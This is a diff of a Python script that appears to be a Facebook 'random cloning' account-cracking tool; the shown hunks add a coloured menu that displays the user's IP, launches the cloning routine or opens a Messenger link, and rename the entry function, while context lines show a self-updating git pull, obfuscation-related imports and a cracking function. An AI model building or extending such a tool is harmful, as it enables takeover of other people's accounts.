@@ -4,6 +4,24 @@ import time
 import requests
 import uuid
 import marshal, base64, zlib
+os.system('clear')
+def o():
+    os.system('clear')
+    print(logo)
+    ip = requests.get("https://api.ipify.org").text
+    print("\033[38;5;46--------------------------------------------")
+    jalan("\033[1;33m[\033[1;33m] \033[92;1mIP ADDRES \033[38;5;196m: \33[m\033[1;91m\033[38;5;46m\033[38;5;46m"+ip)
+    print("\033[38;5;46--------------------------------------------")
+    jalan("\033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mSTART RANDOM CLONING   ")
+    print("\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mFACEBOOK I'D  ")
+    Riyad = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
+    if Riyad == '1':
+        i()
+    if Riyad == '2':
+        os.system('xdg-open https://m.me/j/AbarxjvgBJlxsK8N/')
+    if Riyad == 'E':
+        os.system('exit')
+        return None
 import os,sys,time,json,random,re,string,platform,base64,uuid
 os.system("git pull")
 from bs4 import BeautifulSoup as sop
@@ -67,8 +85,13 @@ class jalan:
             sys.stdout.flush()
             time.sleep(0.040)
 
-os.system('clear')
-def riayd():
+def back():
+	login()
+Riyad="Riyad"
+imt="Riyad"
+ak="CLASS3-"
+myid=uuid.uuid4().hex[:8].upper()
+
             
 RED = '\033[38;5;196m'
 WHITE = '\033[1;97m'
@@ -315,4 +338,4 @@ def rcrack(uid,pwx,tl):
     except:
         pass
         
-riyad()
+o()
